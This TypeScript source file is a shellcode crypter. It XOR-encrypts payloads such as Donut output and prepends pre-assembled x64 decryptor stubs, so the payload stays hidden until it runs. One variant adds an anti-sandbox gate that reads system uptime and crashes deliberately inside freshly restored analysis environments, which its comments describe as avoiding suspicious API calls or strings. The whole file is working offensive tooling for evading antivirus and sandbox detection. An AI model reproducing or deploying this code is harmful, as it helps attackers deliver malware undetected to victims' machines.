// Custom XOR shellcode crypter.
//
// Wraps Donut/Linux shellcode with a position-independent x64 decryptor stub
// so the encrypted payload is never present in cleartext until runtime.
//
// Layout of the output blob:
//   [0..54]   55-byte x64 decryptor stub (see STUB_BYTES)
//   [55..62]  payload_size as uint64 LE (8 bytes)
//   [63..94]  32-byte XOR key
//   [95..]    XOR-encrypted payload
//
// The stub:
//   1. Gets its own address via CALL+POP trick
//   2. Adds STUB_SIZE (55) to reach the metadata region
//   3. XOR-decrypts the payload in place (key wraps at 32 bytes)
//   4. Jumps to the decrypted payload

const STUB_SIZE = 55;

// Pre-assembled x64 position-independent XOR decryptor.
// Verified byte-by-byte:
//   E8 00 00 00 00     CALL $+5
//   5B                 POP  RBX              ; rbx = &byte_5_of_stub
//   48 83 EB 05        SUB  RBX, 5           ; rbx = &stub_start
//   48 81 C3 37 00 00 00  ADD RBX, 55        ; rbx = &size_field (STUB_SIZE = 0x37)
//   48 8B 0B           MOV  RCX, [RBX]       ; rcx = payload_size (uint64)
//   48 8D 73 08        LEA  RSI, [RBX+8]     ; rsi = &key
//   48 8D 7B 28        LEA  RDI, [RBX+40]    ; rdi = &payload (8+32=40)
//   31 C0              XOR  EAX, EAX          ; rax = 0 (index)
// loop:                                       ; offset 30
//   48 3B C1           CMP  RAX, RCX          ; if i >= payload_size → done
//   73 12              JNB  done              ; +18 from next instr (35→53)
//   89 C2              MOV  EDX, EAX
//   83 E2 1F           AND  EDX, 0x1F         ; edx = i & 31 (key index)
//   44 8A 04 16        MOV  R8B, [RSI+RDX]   ; r8b = key[i%32]
//   44 30 04 07        XOR  [RDI+RAX], R8B   ; decrypt byte in place
//   48 FF C0           INC  RAX
//   EB E9              JMP  loop              ; -23 from next instr (53-23=30)
// done:                                       ; offset 53
//   FF D7              JMP  RDI               ; jump to decrypted payload
const STUB_BYTES = Buffer.from([
  0xe8, 0x00, 0x00, 0x00, 0x00, // CALL $+5
  0x5b,                         // POP RBX
  0x48, 0x83, 0xeb, 0x05,       // SUB RBX, 5
  0x48, 0x81, 0xc3, 0x37, 0x00, 0x00, 0x00, // ADD RBX, 55
  0x48, 0x8b, 0x0b,             // MOV RCX, [RBX]
  0x48, 0x8d, 0x73, 0x08,       // LEA RSI, [RBX+8]
  0x48, 0x8d, 0x7b, 0x28,       // LEA RDI, [RBX+40]
  0x31, 0xc0,                   // XOR EAX, EAX
  // loop (offset 30):
  0x48, 0x3b, 0xc1,             // CMP RAX, RCX
  0x73, 0x12,                   // JNB +18 (to done@53)
  0x89, 0xc2,                   // MOV EDX, EAX
  0x83, 0xe2, 0x1f,             // AND EDX, 0x1F
  0x44, 0x8a, 0x04, 0x16,       // MOV R8B, [RSI+RDX]
  0x44, 0x30, 0x04, 0x07,       // XOR [RDI+RAX], R8B
  0x48, 0xff, 0xc0,             // INC RAX
  0xeb, 0xe9,                   // JMP -23 (to loop@30)
  // done (offset 53):
  0xff, 0xd7,                   // JMP RDI
]);

if (STUB_BYTES.length !== STUB_SIZE) {
  throw new Error(`BUG: STUB_BYTES.length=${STUB_BYTES.length} expected ${STUB_SIZE}`);
}

const ENV_STUB_SIZE = 77;

// Pre-assembled x64 position-independent XOR decryptor with uptime anti-sandbox gate.
//
// Before decrypting, reads KUSER_SHARED_DATA.TickCount.LowPart at the fixed
// kernel-mapped address 0x7FFE0320 (readable from any user-mode process on
// all Windows versions).  If the value is below 0x1000 (roughly 64 seconds of
// system uptime), the stub assumes a fresh sandbox snapshot and crashes via a
// controlled NULL dereference — producing a benign-looking access violation
// with no suspicious API calls or strings.
//
// Byte-exact disassembly:
//   E8 00 00 00 00        CALL $+5
//   5B                    POP  RBX                  ; rbx = stub_start
//   48 83 EB 05           SUB  RBX, 5
//   BF 00 00 FE 7F        MOV  EDI, 0x7FFE0000      ; KUSER_SHARED_DATA (zero-extends)
//   8B 87 20 03 00 00     MOV  EAX, [RDI+0x320]     ; TickCount.LowPart
//   3D 00 10 00 00        CMP  EAX, 0x1000          ; ~64 s threshold
//   72 2D                 JB   crash                ; +45 from next instr → offset 73
//   48 81 C3 4D 00 00 00  ADD  RBX, 77 (ENV_STUB_SIZE)
//   48 8B 0B              MOV  RCX, [RBX]           ; payload_size
//   48 8D 73 08           LEA  RSI, [RBX+8]         ; key
//   48 8D 7B 28           LEA  RDI, [RBX+40]        ; payload (8+32)
//   31 C0                 XOR  EAX, EAX
// loop (offset 48):
//   48 3B C1              CMP  RAX, RCX
//   73 12                 JNB  done                 ; +18 from next instr → offset 71
//   89 C2                 MOV  EDX, EAX
//   83 E2 1F              AND  EDX, 0x1F
//   44 8A 04 16           MOV  R8B, [RSI+RDX]
//   44 30 04 07           XOR  [RDI+RAX], R8B
//   48 FF C0              INC  RAX
//   EB E9                 JMP  loop                 ; -23 from next instr → offset 48
// done (offset 71):
//   FF D7                 JMP  RDI
// crash (offset 73):
//   31 C0                 XOR  EAX, EAX
//   FF E0                 JMP  RAX                  ; null deref → AV crash
const ENV_STUB_BYTES = Buffer.from([
  0xe8, 0x00, 0x00, 0x00, 0x00,                   // CALL $+5
  0x5b,                                           // POP RBX
  0x48, 0x83, 0xeb, 0x05,                         // SUB RBX, 5
  0xbf, 0x00, 0x00, 0xfe, 0x7f,                   // MOV EDI, 0x7FFE0000
  0x8b, 0x87, 0x20, 0x03, 0x00, 0x00,             // MOV EAX, [RDI+0x320]
  0x3d, 0x00, 0x10, 0x00, 0x00,                   // CMP EAX, 0x1000
  0x72, 0x2d,                                     // JB crash (+45)
  0x48, 0x81, 0xc3, 0x4d, 0x00, 0x00, 0x00,       // ADD RBX, 77
  0x48, 0x8b, 0x0b,                               // MOV RCX, [RBX]
  0x48, 0x8d, 0x73, 0x08,                         // LEA RSI, [RBX+8]
  0x48, 0x8d, 0x7b, 0x28,                         // LEA RDI, [RBX+40]
  0x31, 0xc0,                                     // XOR EAX, EAX
  // loop (offset 48):
  0x48, 0x3b, 0xc1,                               // CMP RAX, RCX
  0x73, 0x12,                                     // JNB done (+18)
  0x89, 0xc2,                                     // MOV EDX, EAX
  0x83, 0xe2, 0x1f,                               // AND EDX, 0x1F
  0x44, 0x8a, 0x04, 0x16,                         // MOV R8B, [RSI+RDX]
  0x44, 0x30, 0x04, 0x07,                         // XOR [RDI+RAX], R8B
  0x48, 0xff, 0xc0,                               // INC RAX
  0xeb, 0xe9,                                     // JMP loop (-23)
  // done (offset 71):
  0xff, 0xd7,                                     // JMP RDI
  // crash (offset 73):
  0x31, 0xc0,                                     // XOR EAX, EAX
  0xff, 0xe0,                                     // JMP RAX (null deref)
]);

if (ENV_STUB_BYTES.length !== ENV_STUB_SIZE) {
  throw new Error(`BUG: ENV_STUB_BYTES.length=${ENV_STUB_BYTES.length} expected ${ENV_STUB_SIZE}`);
}

export interface XorCrypterResult {
  output: Buffer;
  key: Buffer;
}

function xorEncrypt(shellcode: Buffer): { key: Buffer; encrypted: Buffer; sizeBuf: Buffer } {
  const key = Buffer.alloc(32);
  crypto.getRandomValues(new Uint8Array(key.buffer, key.byteOffset, 32));
  const encrypted = Buffer.alloc(shellcode.length);
  for (let i = 0; i < shellcode.length; i++) {
    encrypted[i] = shellcode[i] ^ key[i % 32];
  }
  const sizeBuf = Buffer.alloc(8);
  sizeBuf.writeBigUInt64LE(BigInt(shellcode.length));
  return { key, encrypted, sizeBuf };
}

/**
 * Wrap shellcode with a plain self-decrypting XOR stub (no env checks).
 * Ready to feed into SGN or use directly as shellcode.
 */
export function wrapXorStub(shellcode: Buffer): XorCrypterResult {
  const { key, encrypted, sizeBuf } = xorEncrypt(shellcode);
  const output = Buffer.concat([STUB_BYTES, sizeBuf, key, encrypted]);
  return { output, key };
}

/**
 * Wrap shellcode with an env-bound XOR stub that includes an uptime anti-sandbox gate.
 *
 * The stub reads KUSER_SHARED_DATA.TickCount.LowPart at 0x7FFE0320 before
 * decrypting.  If system uptime is under ~64 seconds (typical of a freshly
 * restored sandbox snapshot), the stub crashes via a NULL dereference instead
 * of decrypting the payload.  No API calls, no suspicious strings.
 */
export function wrapEnvBoundXorStub(shellcode: Buffer): XorCrypterResult {
  const { key, encrypted, sizeBuf } = xorEncrypt(shellcode);
  const output = Buffer.concat([ENV_STUB_BYTES, sizeBuf, key, encrypted]);
  return { output, key };
}
